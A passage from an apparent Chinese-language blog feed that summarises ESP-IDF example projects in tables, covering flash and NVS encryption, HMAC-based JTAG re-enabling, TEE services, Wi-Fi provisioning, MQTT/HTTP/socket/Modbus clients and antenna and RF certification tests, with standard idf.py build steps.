标准NVS操作函数（nvs_set_i32, nvs_get_i32等）</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 要写入的键值对数据<br><br>输出：<br>- 读取到的数据<br>- 磨损均衡状态信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习Flash磨损均衡的原理和使用<br>- 开发需要频繁写入Flash的应用<br>- 延长Flash寿命的设备<br>- 物联网设备的长期数据存储<br>- 作为磨损均衡应用的参考模板</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——加密</title>
    <link href="/ESP32-examples/18.security/"/>
    <url>/ESP32-examples/18.security/</url>
    
    <content type="html"><![CDATA[<h2 id="18-security-目录"><a href="#18-security-目录" class="headerlink" title="18. security 目录"></a>18. security 目录</h2><h3 id="18-1-flash-encryption"><a href="#18-1-flash-encryption" class="headerlink" title="18.1 flash_encryption"></a>18.1 flash_encryption</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>Flash 加密示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\security\flash_encryption</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何在开发和发布模式下启用和使用 Flash 加密，包括检查 Flash 加密状态、读写加密分区、初始化加密和非加密 FATFS 和 NVS 分区</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- Flash 加密 API</td></tr></tbody></table><ul><li>NVS 加密 API</li><li>FATFS 组件</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>Flash 加密模式（开发或发布）</li><li>分区表配置</li><li>加密密钥设置</li></ul><p>输出结果：</p><ul><li>Flash 加密状态检查结果</li><li>eFuse 状态信息</li><li>加密分区读写结果</li><li>FATFS 和 NVS 初始化状态</li><li>加密数据操作结果 |<br>| <strong>适用场景及典型应用案例</strong> | - 保护敏感数据不被物理读取</li><li>物联网设备的固件保护</li><li>工业设备的安全存储</li><li>金融设备的数据加密</li><li>医疗设备的隐私保护 |</li></ul><h3 id="18-2-hmac-soft-jtag"><a href="#18-2-hmac-soft-jtag" class="headerlink" title="18.2 hmac_soft_jtag"></a>18.2 hmac_soft_jtag</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>HMAC 软 JTAG 示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\security\hmac_soft_jtag</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用 HMAC 外设安全地重新启用软件禁用的 JTAG 接口，实现设备的 Return Material Access (RMA) 功能</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- HMAC 外设 API</td></tr></tbody></table><ul><li>JTAG 控制 API</li><li>console 组件（命令行界面）</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>HMAC 密钥生成</li><li>令牌数据生成</li><li>JTAG 重新启用命令</li></ul><p>输出结果：</p><ul><li>JTAG 状态信息</li><li>HMAC 密钥生成结果</li><li>令牌生成结果</li><li>JTAG 重新启用状态 |<br>| <strong>适用场景及典型应用案例</strong> | - 设备的 RMA（退货授权）流程</li><li>安全调试和维护</li><li>工业设备的远程调试</li><li>智能设备的售后支持 |</li></ul><h3 id="18-3-nvs-encryption-hmac"><a href="#18-3-nvs-encryption-hmac" class="headerlink" title="18.3 nvs_encryption_hmac"></a>18.3 nvs_encryption_hmac</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>NVS 加密 HMAC 示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\security\nvs_encryption_hmac</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用基于 HMAC 的加密密钥保护方案进行 NVS 加密，密钥从 eFuse 存储的 HMAC 密钥派生，无需单独的 nvs_keys 分区</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- NVS 加密 API</td></tr></tbody></table><ul><li>HMAC 外设 API</li><li>eFuse API</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>HMAC 密钥生成</li><li>eFuse 密钥烧录</li><li>NVS 加密方案启用</li></ul><p>输出结果：</p><ul><li>HMAC 密钥生成结果</li><li>eFuse 烧录状态</li><li>NVS 加密初始化状态</li><li>NVS 读写操作结果 |<br>| <strong>适用场景及典型应用案例</strong> | - 物联网设备的配置存储</li><li>敏感配置数据的保护</li><li>设备凭证的安全存储</li><li>加密密钥的管理 |</li></ul><h3 id="18-4-security-features-app"><a href="#18-4-security-features-app" class="headerlink" title="18.4 security_features_app"></a>18.4 security_features_app</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>安全功能应用示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\security\security_features_app</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何同时启用多种安全功能，包括 Secure Boot V2、Flash Encryption、HMAC-based NVS Encryption 和 Secure JTAG Return Material Access</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- Secure Boot V2 API</td></tr></tbody></table><ul><li>Flash 加密 API</li><li>NVS 加密 API</li><li>HMAC 外设 API</li><li>JTAG 控制 API</li><li>支持 ESP32-C3 和 ESP32-S3 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>Secure Boot V2 密钥生成和烧录</li><li>Flash 加密启用</li><li>NVS 加密配置</li><li>Secure JTAG 配置</li></ul><p>输出结果：</p><ul><li>安全功能启用状态</li><li>eFuse 烧录结果</li><li>Flash 加密状态</li><li>NVS 加密初始化状态</li><li>JTAG 状态信息 |<br>| <strong>适用场景及典型应用案例</strong> | - 生产环境中的设备安全配置</li><li>高安全性要求的物联网设备</li><li>企业级设备的安全部署</li><li>批量设备的安全配置 |</li></ul><h3 id="18-5-tee-Trusted-Execution-Environment"><a href="#18-5-tee-Trusted-Execution-Environment" class="headerlink" title="18.5 tee (Trusted Execution Environment)"></a>18.5 tee (Trusted Execution Environment)</h3><h4 id="18-5-1-tee-basic"><a href="#18-5-1-tee-basic" class="headerlink" title="18.5.1 tee_basic"></a>18.5.1 tee_basic</h4><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>TEE 基础示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\security\tee\tee_basic</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用 ESP-TEE 框架在可信执行环境中执行安全服务，包括 AES 加密/解密操作</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- ESP-TEE 框架</td></tr></tbody></table><ul><li>AES 加密 API</li><li>安全服务组件</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>TEE 安全服务注册</li><li>加密/解密操作配置</li></ul><p>输出结果：</p><ul><li>TEE 初始化状态</li><li>安全服务注册结果</li><li>加密/解密操作结果 |<br>| <strong>适用场景及典型应用案例</strong> | - 敏感数据的加密/解密</li><li>安全密钥管理</li><li>数字签名生成和验证</li><li>安全认证 |</li></ul><h4 id="18-5-2-tee-attestation"><a href="#18-5-2-tee-attestation" class="headerlink" title="18.5.2 tee_attestation"></a>18.5.2 tee_attestation</h4><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>TEE 证明示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\security\tee\tee_attestation</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用 ESP-TEE 框架生成实体证明令牌，用于设备身份验证和完整性验证</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- ESP-TEE 框架</td></tr></tbody></table><ul><li>证明令牌生成 API</li><li>加密密钥管理</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>证明密钥生成</li><li>设备身份信息配置</li></ul><p>输出结果：</p><ul><li>TEE 初始化状态</li><li>证明令牌生成结果</li><li>设备身份验证状态 |<br>| <strong>适用场景及典型应用案例</strong> | - 设备身份验证</li><li>固件完整性验证</li><li>安全启动流程</li><li>物联网设备的可信连接 |</li></ul><h4 id="18-5-3-tee-secure-ota"><a href="#18-5-3-tee-secure-ota" class="headerlink" title="18.5.3 tee_secure_ota"></a>18.5.3 tee_secure_ota</h4><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>TEE 安全 OTA 示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\security\tee\tee_secure_ota</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用 ESP-TEE 框架进行安全 OTA 更新，确保固件更新的安全性和完整性</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- ESP-TEE 框架</td></tr></tbody></table><ul><li>OTA 服务 API</li><li>HTTPS 客户端</li><li>固件签名验证</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>OTA 服务器配置</li><li>固件签名验证配置</li><li>安全更新策略</li></ul><p>输出结果：</p><ul><li>TEE 初始化状态</li><li>OTA 连接状态</li><li>固件下载进度</li><li>固件验证结果</li><li>更新结果 |<br>| <strong>适用场景及典型应用案例</strong> | - 安全固件更新</li><li>设备远程管理</li><li>漏洞修复</li><li>功能升级 |</li></ul><h4 id="18-5-4-tee-secure-storage"><a href="#18-5-4-tee-secure-storage" class="headerlink" title="18.5.4 tee_secure_storage"></a>18.5.4 tee_secure_storage</h4><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>TEE 安全存储示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\security\tee\tee_secure_storage</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用 ESP-TEE 框架提供的安全存储功能，实现数据的加密存储和签名保护</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- ESP-TEE 框架</td></tr></tbody></table><ul><li>安全存储 API</li><li>加密和签名 API</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>安全存储区域配置</li><li>数据加密策略</li><li>签名验证配置</li></ul><p>输出结果：</p><ul><li>TEE 初始化状态</li><li>安全存储初始化状态</li><li>数据读写操作结果</li><li>签名验证结果 |<br>| <strong>适用场景及典型应用案例</strong> | - 敏感数据的安全存储</li><li>密钥和凭证管理</li><li>配置数据的完整性保护</li><li>审计日志的不可篡改存储 |</li></ul><h3 id="18-6-技术要点"><a href="#18-6-技术要点" class="headerlink" title="18.6 技术要点"></a>18.6 技术要点</h3><ul><li><p><strong>安全启动</strong>：</p><ul><li>支持 Secure Boot V2</li><li>多签名密钥支持</li><li>固件完整性验证</li><li>防回滚保护</li></ul></li><li><p><strong>Flash 加密</strong>：</p><ul><li>支持开发和发布模式</li><li>AES-XTS 加密算法</li><li>分区级加密控制</li><li>加密密钥管理</li></ul></li><li><p><strong>NVS 加密</strong>：</p><ul><li>基于 HMAC 的密钥派生</li><li>无需单独的密钥分区</li><li>透明的加密/解密操作</li><li>支持多个加密 NVS 分区</li></ul></li><li><p><strong>JTAG 安全</strong>：</p><ul><li>软件禁用 JTAG</li><li>HMAC 认证重新启用</li><li>RMA 流程支持</li><li>调试权限管理</li></ul></li><li><p><strong>TEE 功能</strong>：</p><ul><li>隔离的可信执行环境</li><li>安全服务注册</li><li>加密操作保护</li><li>安全存储</li><li>远程证明</li><li>安全 OTA</li></ul></li></ul><h3 id="18-7-构建与运行"><a href="#18-7-构建与运行" class="headerlink" title="18.7 构建与运行"></a>18.7 构建与运行</h3><ol><li>设置目标芯片：<code>idf.py set-target &lt;chip_name&gt;</code></li><li>配置项目：<code>idf.py menuconfig</code></li><li>选择安全功能配置</li><li>构建项目：<code>idf.py build</code></li><li>烧录并监控：<code>idf.py -p PORT flash monitor</code></li><li>运行测试或使用命令行工具进行验证</li></ol><h3 id="18-8-应用场景总结"><a href="#18-8-应用场景总结" class="headerlink" title="18.8 应用场景总结"></a>18.8 应用场景总结</h3><ul><li>适用于对安全性要求较高的设备</li><li>保护敏感数据和固件</li><li>支持多种安全功能的组合使用</li><li>适合物联网、工业自动化、金融、医疗等领域</li><li>提供从开发到生产的完整安全解决方案</li></ul><p>这些例程展示了 ESP-IDF 在设备安全方面的强大功能，涵盖了从固件保护到数据加密，再到安全执行环境的全方位安全解决方案，为开发者提供了构建高安全性设备的工具和示例。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——Wi-Fi 配网管理器</title>
    <link href="/ESP32-examples/05.provisioning/"/>
    <url>/ESP32-examples/05.provisioning/</url>
    
    <content type="html"><![CDATA[<h2 id="5-provisioning-目录"><a href="#5-provisioning-目录" class="headerlink" title="5. provisioning 目录"></a>5. provisioning 目录</h2><h3 id="5-1-wifi-prov-mgr"><a href="#5-1-wifi-prov-mgr" class="headerlink" title="5.1 wifi_prov_mgr"></a>5.1 wifi_prov_mgr</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>Wi-Fi 配网管理器示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\provisioning\wifi_prov_mgr</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用 wifi_provisioning 管理器组件构建配网应用，支持 BLE 和 SoftAP 两种传输方式，实现设备的 Wi-Fi 配置</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- wifi_provisioning 管理器组件</td></tr></tbody></table><ul><li>protocomm 组件（协议通信）</li><li>protobuf 组件（数据序列化）</li><li>BLE 驱动（默认使用 NimBLE，支持 Bluedroid）</li><li>SoftAP 模式支持</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>传输方式（BLE 或 SoftAP）</li><li>安全版本（1 或 2）</li><li>证明密钥（Pop）</li><li>SSID 和密码</li><li>自定义数据</li></ul><p>输出结果：</p><ul><li>配网启动状态</li><li>服务名称（PROV_XXXXXX）</li><li>Wi-Fi 凭据接收状态</li><li>连接结果</li><li>IP 地址获取情况</li><li>自定义数据处理结果 |<br>| <strong>适用场景及典型应用案例</strong> | - 物联网设备的初次配置</li><li>智能家居设备的 Wi-Fi 连接</li><li>工业设备的网络配置</li><li>无线传感器的远程配置</li><li>批量设备的快速配网 |</li></ul><h3 id="5-2-技术要点"><a href="#5-2-技术要点" class="headerlink" title="5.2 技术要点"></a>5.2 技术要点</h3><ul><li><p><strong>配网方式</strong>：</p><ul><li>支持 BLE 和 SoftAP 两种传输方式</li><li>BLE 模式默认使用 NimBLE 主机</li><li>SoftAP 模式作为 ESP32-S2 的默认选项</li><li>支持 QR 码扫描配网</li></ul></li><li><p><strong>安全机制</strong>：</p><ul><li>支持安全版本 1（基于证明密钥的认证）</li><li>支持安全版本 2（基于 SRP6a 的认证）</li><li>支持链路加密</li><li>安全会话建立</li></ul></li><li><p><strong>功能扩展</strong>：</p><ul><li>支持自定义数据端点</li><li>支持实时 Wi-Fi 扫描结果</li><li>支持批量设备配置</li><li>支持交互式配网</li></ul></li><li><p><strong>配网流程</strong>：</p><ul><li>设备进入配网模式</li><li>手机/PC 连接设备</li><li>建立安全会话</li><li>发送 Wi-Fi 凭据</li><li>设备连接 Wi-Fi</li><li>配网完成，断开连接</li></ul></li><li><p><strong>状态管理</strong>：</p><ul><li>配网状态保存</li><li>已配网设备自动连接 Wi-Fi</li><li>支持恢复出厂设置</li></ul></li></ul><h3 id="5-3-配网应用支持"><a href="#5-3-配网应用支持" class="headerlink" title="5.3 配网应用支持"></a>5.3 配网应用支持</h3><ul><li><p><strong>Android 应用</strong>：</p><ul><li><a href="https://play.google.com/store/apps/details?id=com.espressif.provble">BLE Provisioning app on Play Store</a></li><li><a href="https://play.google.com/store/apps/details?id=com.espressif.provsoftap">SoftAP Provisioning app on Play Store</a></li><li>源代码：<a href="https://github.com/espressif/esp-idf-provisioning-android">esp-idf-provisioning-android</a></li></ul></li><li><p><strong>iOS 应用</strong>：</p><ul><li><a href="https://apps.apple.com/in/app/esp-ble-provisioning/id1473590141">BLE Provisioning app on app store</a></li><li><a href="https://apps.apple.com/in/app/esp-softap-provisioning/id1474040630">SoftAP Provisioning app on app Store</a></li><li>源代码：<a href="https://github.com/espressif/esp-idf-provisioning-ios">esp-idf-provisioning-ios</a></li></ul></li><li><p><strong>命令行工具</strong>：</p><ul><li>Python 脚本：<code>$IDF_PATH/tools/esp_prov/esp_prov.py</code></li><li>支持 BLE 和 SoftAP 传输</li><li>支持交互式和非交互式配网</li></ul></li></ul><h3 id="5-4-QR-码配网"><a href="#5-4-QR-码配网" class="headerlink" title="5.4 QR 码配网"></a>5.4 QR 码配网</h3><p>QR 码格式示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;ver&quot;</span>:<span class="hljs-string">&quot;v1&quot;</span>,<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;PROV_000318&quot;</span>,<span class="hljs-attr">&quot;pop&quot;</span>:<span class="hljs-string">&quot;a1000318&quot;</span>,<span class="hljs-attr">&quot;transport&quot;</span>:<span class="hljs-string">&quot;softap&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>包含字段：</p><ul><li>ver：版本号</li><li>name：设备名称</li><li>pop：证明密钥</li><li>transport：传输方式（ble 或 softap）</li></ul><h3 id="5-5-构建与运行"><a href="#5-5-构建与运行" class="headerlink" title="5.5 构建与运行"></a>5.5 构建与运行</h3><ol><li>设置目标芯片：<code>idf.py set-target &lt;chip_name&gt;</code></li><li>配置项目：<code>idf.py menuconfig</code></li><li>选择传输方式（BLE 或 SoftAP）</li><li>构建项目：<code>idf.py build</code></li><li>烧录并监控：<code>idf.py -p PORT flash monitor</code></li><li>使用配网应用或命令行工具进行配网</li></ol><h3 id="5-6-应用场景总结"><a href="#5-6-应用场景总结" class="headerlink" title="5.6 应用场景总结"></a>5.6 应用场景总结</h3><ul><li>适用于物联网设备的初次配置</li><li>支持多种配网方式，适应不同场景需求</li><li>提供安全的配网机制</li><li>支持批量设备配置</li><li>适合智能家居、工业自动化、无线传感器等领域</li></ul><p>这个例程展示了 ESP-IDF 在设备配网方面的强大功能，为开发者提供了一个完整的配网解决方案，可以根据实际需求进行定制和扩展。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——MQTT、http、sockets、modbus</title>
    <link href="/ESP32-examples/16.protocols(WIP)/"/>
    <url>/ESP32-examples/16.protocols(WIP)/</url>
    
    <content type="html"><![CDATA[<h2 id="16-protocols-目录"><a href="#16-protocols-目录" class="headerlink" title="16. protocols 目录"></a>16. protocols 目录</h2><h3 id="16-1-mqtt-tcp-例程"><a href="#16-1-mqtt-tcp-例程" class="headerlink" title="16.1 mqtt/tcp 例程"></a>16.1 mqtt/tcp 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>mqtt/tcp</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\protocols\mqtt\tcp</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用ESP-MQTT库实现MQTT客户端，通过TCP传输连接到MQTT broker。实现了连接到broker、订阅/取消订阅主题、发布消息等功能。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>mqtt_event_handler()</code>：处理MQTT事件<br>- <code>esp_mqtt_client_init()</code>：初始化MQTT客户端<br>- <code>esp_mqtt_client_start()</code>：启动MQTT客户端<br>- <code>esp_mqtt_client_publish()</code>：发布MQTT消息<br>- <code>esp_mqtt_client_subscribe()</code>：订阅MQTT主题<br>- <code>esp_mqtt_client_unsubscribe()</code>：取消订阅MQTT主题</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 配置的MQTT broker URI（通过menuconfig设置）<br>- Wi-Fi SSID和密码<br><br>输出：<br>- MQTT连接状态<br>- 消息发布结果<br>- 订阅/取消订阅结果<br>- 接收到的MQTT消息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习MQTT协议的实现和使用<br>- 开发物联网设备与云平台的通信<br>- 构建基于MQTT的传感器网络<br>- 智能家居设备的远程控制<br>- 作为MQTT客户端应用的参考模板</td></tr></tbody></table><h3 id="16-2-http-request-例程"><a href="#16-2-http-request-例程" class="headerlink" title="16.2 http_request 例程"></a>16.2 http_request 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>http_request</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\protocols\http_request</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用POSIX socket API实现简单的HTTP请求。通过创建TCP连接、发送HTTP请求和接收HTTP响应，展示了HTTP客户端的基本实现。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>http_request_task()</code>：执行HTTP请求的任务<br>- <code>socket()</code>：创建socket<br>- <code>getaddrinfo()</code>：解析域名<br>- <code>connect()</code>：建立TCP连接<br>- <code>send()</code>：发送HTTP请求<br>- <code>recv()</code>：接收HTTP响应</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 目标URL（硬编码在程序中）<br>- Wi-Fi SSID和密码<br><br>输出：<br>- HTTP请求结果<br>- 服务器返回的HTTP响应<br>- 连接状态信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习HTTP协议的基本实现<br>- 了解POSIX socket API的使用<br>- 开发简单的HTTP客户端应用<br>- 测试网络连接<br>- 作为HTTP客户端应用的参考模板</td></tr></tbody></table><h3 id="16-3-sockets-tcp-client-例程"><a href="#16-3-sockets-tcp-client-例程" class="headerlink" title="16.3 sockets/tcp_client 例程"></a>16.3 sockets/tcp_client 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>sockets/tcp_client</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\protocols\sockets\tcp_client</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用POSIX socket API实现TCP客户端。实现了TCP连接的建立、数据发送和接收，支持IPv4和IPv6两种协议。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>tcp_client_task()</code>：TCP客户端任务<br>- <code>socket()</code>：创建socket<br>- <code>getaddrinfo()</code>：解析域名或IP地址<br>- <code>connect()</code>：建立TCP连接<br>- <code>send()</code>：发送数据<br>- <code>recv()</code>：接收数据</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 目标服务器IP地址或域名<br>- 目标端口号<br>- Wi-Fi SSID和密码<br><br>输出：<br>- TCP连接状态<br>- 发送的数据<br>- 接收的数据</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习TCP客户端的基本实现<br>- 了解POSIX socket API的使用<br>- 开发基于TCP的客户端应用<br>- 测试TCP服务器<br>- 作为TCP客户端应用的参考模板</td></tr></tbody></table><h3 id="16-4-https-request-例程"><a href="#16-4-https-request-例程" class="headerlink" title="16.4 https_request 例程"></a>16.4 https_request 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>https_request</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\protocols\https_request</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用ESP-IDF的HTTPS客户端API实现安全的HTTP请求。支持TLS加密、服务器证书验证，并展示了如何获取服务器时间。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>https_request_task()</code>：执行HTTPS请求的任务<br>- <code>esp_https_client_init()</code>：初始化HTTPS客户端<br>- <code>esp_https_client_open()</code>：打开HTTPS连接<br>- <code>esp_https_client_read()</code>：读取HTTPS响应<br>- <code>esp_https_client_close()</code>：关闭HTTPS连接<br>- <code>esp_https_client_cleanup()</code>：清理HTTPS客户端资源</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 目标HTTPS URL（硬编码在程序中）<br>- 服务器根证书（硬编码在程序中）<br>- Wi-Fi SSID和密码<br><br>输出：<br>- HTTPS请求结果<br>- 服务器返回的HTTPS响应<br>- 服务器时间信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习HTTPS客户端的基本实现<br>- 了解TLS加密和证书验证<br>- 开发安全的HTTP客户端应用<br>- 连接需要身份验证的云服务<br>- 作为HTTPS客户端应用的参考模板</td></tr></tbody></table><h3 id="16-5-modbus-serial-mb-slave-例程"><a href="#16-5-modbus-serial-mb-slave-例程" class="headerlink" title="16.5 modbus/serial/mb_slave 例程"></a>16.5 modbus/serial/mb_slave 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>modbus/serial/mb_slave</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\protocols\modbus\serial\mb_slave</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用ESP-IDF的Modbus组件实现Modbus RTU从机。支持线圈、离散输入、保持寄存器和输入寄存器四种数据类型，通过串行接口与Modbus主机通信。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>mb_slave_init()</code>：初始化Modbus从机<br>- <code>mb_slave_start()</code>：启动Modbus从机<br>- <code>mb_example_init_gpio()</code>：初始化GPIO<br>- <code>mb_register_callbacks()</code>：注册回调函数<br>- 各种Modbus数据处理函数</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- Modbus主机发送的命令<br><br>输出：<br>- Modbus从机的响应<br>- 寄存器数据<br>- 线圈状态</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习Modbus协议的基本实现<br>- 了解Modbus从机的工作原理<br>- 开发基于Modbus的工业设备<br>- 构建工业自动化系统<br>- 作为Modbus从机应用的参考模板</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——phy</title>
    <link href="/ESP32-examples/07.phy/"/>
    <url>/ESP32-examples/07.phy/</url>
    
    <content type="html"><![CDATA[<h2 id="7-phy-目录"><a href="#7-phy-目录" class="headerlink" title="7. phy 目录"></a>7. phy 目录</h2><h3 id="7-1-antenna"><a href="#7-1-antenna" class="headerlink" title="7.1 antenna"></a>7.1 antenna</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>Wi-Fi 天线软切换示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\phy\antenna</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用 ESP 芯片的多天线软件切换功能，实现 Wi-Fi 天线的动态选择和切换</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- Wi-Fi 驱动</td></tr></tbody></table><ul><li>天线切换组件（antenna_soft_switch）</li><li>事件处理系统</li><li>支持 ESP32、ESP32-C2、ESP32-C3、ESP32-C6、ESP32-S2、ESP32-S3 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>Wi-Fi SSID 和密码</li><li>天线切换 GPIO 引脚配置</li></ul><p>输出结果：</p><ul><li>Wi-Fi 连接状态</li><li>天线切换状态</li><li>接收和发射模式</li><li>天线使能状态</li><li>连接的 AP 信息 |<br>| <strong>适用场景及典型应用案例</strong> | - 智能家居设备的信号优化</li><li>物联网设备的无线通信增强</li><li>移动设备的天线切换机制</li><li>信号质量动态优化系统</li><li>工业自动化设备的无线连接 |</li></ul><h3 id="7-2-cert-test"><a href="#7-2-cert-test" class="headerlink" title="7.2 cert_test"></a>7.2 cert_test</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>认证测试示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\phy\cert_test</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用认证测试 API，提供 Wi-Fi 和 Bluetooth 认证测试功能，用于 RF 认证测试</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- Wi-Fi 认证测试 API</td></tr></tbody></table><ul><li>Bluetooth 认证测试 API</li><li>console 组件（命令行界面）</li><li>事件处理系统</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>启用 RF 认证测试功能</li><li>禁用中断看门狗</li><li>禁用任务看门狗定时器</li></ul><p>输出结果：</p><ul><li>命令执行状态和结果</li><li>测试配置信息</li><li>测试数据和统计</li><li>RSSI 值</li><li>发送和接收状态 |<br>| <strong>适用场景及典型应用案例</strong> | - 无线设备的认证测试</li><li>RF 